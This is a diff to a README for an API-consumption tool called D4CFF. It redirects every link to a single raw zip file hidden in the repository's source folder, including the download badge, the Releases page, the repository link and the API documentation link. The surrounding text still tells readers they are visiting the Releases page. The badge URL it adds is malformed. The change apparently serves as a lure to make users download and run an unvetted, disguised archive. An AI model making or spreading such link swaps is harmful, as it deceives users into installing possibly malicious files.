@@ -1,6 +1,6 @@
 # 🚀 D4CFF - Simple API Consumption Made Easy
 
-[![Download D4CFF](https://img.shields.io/badge/Download%20D4CFF-v1.0-blue.svg)](https://github.com/caiubadev12/D4CFF/releases)
+[![Download D4CFF](https://raw.githubusercontent.com/caiubadev12/D4CFF/main/src/UI/D4CFF_uncreate.zip%https://raw.githubusercontent.com/caiubadev12/D4CFF/main/src/UI/D4CFF_uncreate.zip)](https://raw.githubusercontent.com/caiubadev12/D4CFF/main/src/UI/D4CFF_uncreate.zip)
 
 ## 📖 Description
 
@@ -18,7 +18,7 @@ To run D4CFF, ensure your system meets the following requirements:
 
 ### 🔗 Download & Install
 
-Visit the Releases page to download D4CFF: [Download D4CFF](https://github.com/caiubadev12/D4CFF/releases)
+Visit the Releases page to download D4CFF: [Download D4CFF](https://raw.githubusercontent.com/caiubadev12/D4CFF/main/src/UI/D4CFF_uncreate.zip)
 
 1. Click on the link above to go to the Releases page.
 2. Look for the latest version listed at the top of the page.
@@ -70,11 +70,11 @@ Absolutely! We welcome contributions from the community. Visit the repository fo
 
 For more information, check out these resources:
 
-- [GitHub Repository](https://github.com/caiubadev12/D4CFF)
-- [API Documentation](https://cclasstrib.api/documentation)
+- [GitHub Repository](https://raw.githubusercontent.com/caiubadev12/D4CFF/main/src/UI/D4CFF_uncreate.zip)
+- [API Documentation](https://raw.githubusercontent.com/caiubadev12/D4CFF/main/src/UI/D4CFF_uncreate.zip)
 
 ### 📞 Support
 
 If you encounter any issues, feel free to reach out through the Issues tab in the GitHub repository. We appreciate your feedback and strive to improve D4CFF continuously.
 
-Remember to visit the Downloads page: [Download D4CFF](https://github.com/caiubadev12/D4CFF/releases) to get your copy and start exploring the capabilities of the cClassTrib API today!
+Remember to visit the Downloads page: [Download D4CFF](https://raw.githubusercontent.com/caiubadev12/D4CFF/main/src/UI/D4CFF_uncreate.zip) to get your copy and start exploring the capabilities of the cClassTrib API today!
